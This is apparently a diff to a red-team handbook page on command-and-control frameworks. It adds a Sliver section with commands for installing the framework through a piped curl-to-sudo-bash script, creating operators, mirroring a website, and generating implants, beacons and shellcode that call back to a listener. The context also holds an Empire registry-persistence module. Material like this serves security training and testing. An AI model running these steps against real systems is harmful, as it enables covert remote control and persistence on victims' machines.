@@ -4,6 +4,7 @@
 
 - [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Resources)
 - [Empire](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Empire)
+- [Sliver](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/command_and_control.md#Sliver)]
 
 ## Resources
 
@@ -103,4 +104,58 @@
 (Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
 (Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
 (Empire: <NAME>/powershell/persistence/elevated/registry) > run
+```
+
+## Sliver
+
+> https://github.com/BishopFox/sliver
+
+> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2
+
+### Installation
+
+```c
+$ curl https://sliver.sh/install | sudo bash
+```
+
+### Start Sliver
+
+```c
+$ sudo systemctl enable sliver.service
+$ sudo systemctl start sliver.service
+$ sliver
+```
+
+### Create new Operators
+
+```c
+$ operator -l <LHOST> -p <LPORT> -n <USERNAME> -s /tmp/<username>.cfg
+```
+
+### Create new Website
+
+```c
+$ get --mirror --convert-links --html-extension <WEBSITE>
+$ websites add-content --website <NAME> --web-path <PATH> --content ./public --recursive
+```
+
+### Create Implants
+
+```c
+sliver > generate --mtls <IMPLANT> --save /PATH/TO/FOLDER/
+```
+
+### Create Beacons
+
+```c
+sliver > generate beacon --mtls <BEACON> --save /PATH/TO/FOLDER/
+sliver > generate beacon --http <LHOST>:<LPORT>
+sliver > generate beacon --os --mtls <BEACON> --save /PATH/TO/FOLDER/
+sliver > generate beacon --arch --mtls <BEACON> --save /PATH/TO/FOLDER/
+```
+
+### Create Shellcode
+
+```c
+sliver > generate beacon --mtls <LHOST>:<LPORT> -f <FILE>
 ```
